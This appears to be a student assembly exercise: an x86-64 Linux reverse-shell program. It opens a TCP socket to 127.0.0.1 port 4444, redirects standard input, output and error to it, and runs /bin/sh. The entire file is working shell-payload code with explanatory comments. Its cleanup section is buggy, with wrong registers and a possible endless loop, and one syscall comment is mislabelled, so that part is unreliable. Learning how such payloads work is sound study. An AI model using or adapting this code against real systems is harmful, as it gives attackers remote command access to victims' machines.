;PEX1
;Garret M. Gwozdz
;Documentation: https://gist.github.com/geyslan/5174296 , I used this as a a guideline of what I needed to do. Its in x86 32 so all the syscalls were different in execution but I think they were in the right orde, maybe.

SECTION .data
sh: db "/bin/sh",0 

SECTION .text
    global _start
_start:
    ;a. Create a Stream Socket
    mov rax, 41     ; syscall 41 - socketcall
    mov rdi, 2      ; family: AF_INET 2 
    mov rsi, 1      ; type: SOCK_STREAM 1 stream socket
    mov rdx, 0      ; Protocol: IPPROTO_IP 0
    syscall         ; syscall to create socket

    ;check to see if it works
    test rax, rax   ; checks to see if rax is negative
    js end          ; jumps if negative

    ;connect to socket
    mov rdi, rax    ; sockfd
    mov rdx, 16     ; length
    mov rax, 42     ; syscall for connect


    ; build a sockaddr_in structure
    mov dword [rsp-4], 0x0100007f    ; Address (127.0.0.1)
    mov word [rsp-6], 0x5c11   ; port in byte reverse order (2 bytes)
    mov byte [rsp-8], 0x02       ; AF_INET 2
    sub rsp, 8
    mov rsi, rsp       ; stores struct address in RSI

    syscall            ; syscall for connect

    ; checks to see if it works
    test rax, rax   ; checks to see if rax is negative  
    js end          ; jumps if negative

    ;duplicating the file descriptors so they can be redirrected to the socket
    mov rax, 33     ; sys_dup2
    mov rsi, 0x00   ; stdin file descriptor

    syscall
  
    mov rax, 33     ;sys_dup2
    mov rsi, 0x01   ;stdout file desciptor
   
    syscall

    mov rax, 33     ;sys_dup2
    mov rsi, 0x02   ;stderr file descriptor
    
    syscall

    ;execute a shell (/bin/sh)
    mov rax, 59     ;syscall

    mov rdi, sh    ; pointer to "/bin/sh
;    mov qword [rsp-8],0x0068732f6e69622f
;    sub rsp, 8
;    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0

    syscall

end:
    mov rax, 41     ; syscall 41 - socketcall
    mov rbx, 2      ; socketcall type (sys_shutdown 2)

    mov rdi, rdx    ; socket address
    mov rsi, 2      ; shutdown all

    syscall         ; interupt

    test rax, rax   ; test to make sure it works
    jz end
